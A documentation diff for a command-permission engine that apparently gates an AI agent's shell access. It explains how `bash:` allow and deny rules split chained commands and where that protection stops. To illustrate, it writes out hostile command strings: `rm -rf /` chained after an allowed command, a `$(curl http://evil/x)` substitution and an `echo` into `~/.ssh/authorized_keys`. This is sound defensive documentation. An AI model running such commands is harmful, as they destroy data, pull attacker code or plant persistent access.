@@ -112,7 +112,9 @@ cru.modes.review = {
 Rules are evaluated first, the bare stance second. Both use the same grammar and
 the same engine as `[permissions]`, so `bash:rg *` inherits its handling of
 chained commands — a mode that permits `rg` does **not** thereby permit
-`rg foo && rm -rf /`.
+`rg foo && rm -rf /`. What that handling covers, and where it stops, is stated
+in [What a `bash:` rule covers](#what-a-bash-rule-covers) below; read it before
+relying on a mode's `allow` list as a boundary.
 
 Modes come after hooks deliberately. A stance is a static declaration; a hook is
 a decision. `cru.modes.auto` saying "allow by default" must not override a hook
@@ -130,6 +132,65 @@ This step is easy to forget and it changes behaviour: the same tool call that
 ### 7 — Prompt
 
 Whatever is left reaches you, with a diff preview where one can be synthesised.
+
+## What a `bash:` rule covers
+
+A `bash:` rule's glob is matched against a command *string*, and one string can
+run several commands. Layer 2 and layer 5 therefore do not match the rule
+against the whole line: they split it into statements first and evaluate each
+one, so an `allow` rule only ever speaks for the command it names.
+
+This section is the guarantee, stated once. It applies wherever the engine
+runs — `[permissions]`, a mode's `permissions` block, and the saved patterns of
+layer 3.
+
+**The line is split on** `&&`, `||`, `;`, `|`, a bare `&`, and a newline —
+outside quotes, and honouring backslash escapes. Every statement is checked
+independently: the hardcoded denies and the `deny` rules must clear *all* of
+them, and `Allow` requires *every* one to match an `allow` rule. So
+`allow = ["bash:git *"]` with `deny = ["bash:rm *"]` denies all of
+`git status && rm -rf /tmp/x`, `git status; rm …`, `git status | rm …`,
+`git status & rm …`, and the same lines written across two lines.
+
+Redirection syntax is not mistaken for a separator, so `2>&1`, `>&2`, `<&0` and
+`&> out.log` stay part of the command they belong to.
+
+**Some constructs hide a command from the splitter**, and where they appear the
+decision falls to your configured `default` — `ask` unless you changed it —
+instead of to whichever command happens to be leftmost:
+
+- `` `…` `` and `$(…)` command substitution, including inside double quotes
+  (single quotes suppress substitution, so those are matched normally)
+- `<(…)` and `>(…)` process substitution
+- a quote that never closes, which makes everything the scan saw after it
+  unreliable
+
+`git log $(curl http://evil/x)` therefore prompts rather than riding
+`bash:git *`. This is a deliberate widening of what prompts: a workflow that
+used to run silently under an `allow` rule will start asking once it contains a
+substitution. A `deny` rule and a hardcoded deny still win over this fallback —
+falling back never softens a refusal into a prompt.
+
+**What it does not cover.** Be concrete about the edges rather than trusting the
+split further than it goes:
+
+- **Redirection targets are not modelled.** An `allow` rule constrains *which*
+  command runs, never *where it writes*: `bash:echo *` permits
+  `echo hi > ~/.ssh/authorized_keys`. Reporting `>` alongside the constructs
+  above was considered and rejected — it hides no second command, and firing on
+  every `> /dev/null` would make prompting the normal case. Allow-list only
+  commands you would trust with a filesystem write, and reach for a Lua hook
+  (layer 4) when you need the argument-level decision.
+- **The allowed command's own power is yours to judge.** `bash:git *` permits
+  `git config`, aliases, and hooks; most useful binaries are a write primitive
+  or an execution primitive given the right flags.
+- **Indirection is not unwrapped.** `eval`, `sh -c "…"`, `xargs`, a shell
+  function, `env VAR=… cmd`, and heredocs are matched as the text you see;
+  nothing expands them first.
+
+The splitter is `split_command_line` in
+`crates/crucible-core/src/config/components/permissions/normalize.rs`, and it is
+the source of truth if this section drifts.
 
 ## Above the chain
 
